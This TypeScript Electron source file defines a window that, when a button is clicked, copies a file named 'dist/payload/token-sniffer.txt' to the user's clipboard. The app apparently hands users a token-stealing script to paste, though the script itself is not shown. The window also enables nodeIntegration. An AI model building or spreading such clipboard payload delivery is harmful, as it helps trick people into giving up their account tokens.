import {ipcMain, BrowserWindow, clipboard, dialog} from "electron";
import * as fs from "fs";
import * as path from "path";

const ui_events_pipe = 'ui-events-pipe';

export class ProvideAccessWindow extends BrowserWindow {
    constructor(private readyToShow?: Function, private showByDefault: boolean = true){
        //height used values: 325, 280, 265
        super({
            width: 640,
            height: 265,
            webPreferences: {
                nodeIntegration: true,
                //devTools: false
            },
            show: false,
            resizable: false,
        });

        this.loadFile('dist/ui/provide_access.html');

        this.bind_events();
        this.bind_user_events();
    }

    private bind_events(){
        if(this.showByDefault){
            this.once('ready-to-show', () => {
                this.show();
                
                if(this.readyToShow) this.readyToShow();
            });
        }
    }

    private bind_user_events(){
        ipcMain.on(ui_events_pipe, (event, msg) => {
            if(msg == 'instruction_copy'){
                let instructionCodePath = 'dist/payload/token-sniffer.txt';

                fs.readFile(instructionCodePath, (err, data: Buffer) => {
                    if(err){
                        let cantCopyCode = 'Не удалось скопировать код';
                        dialog.showErrorBox(cantCopyCode, `${cantCopyCode}\nПопробуйте переустановить приложение\n\nPayload file: ${instructionCodePath}`);
                        return;
                    }

                    clipboard.writeText(data.toString('utf8'));
                    this.webContents.send(ui_events_pipe, 'instruction_copied');
                });
            }
        });
    }
}
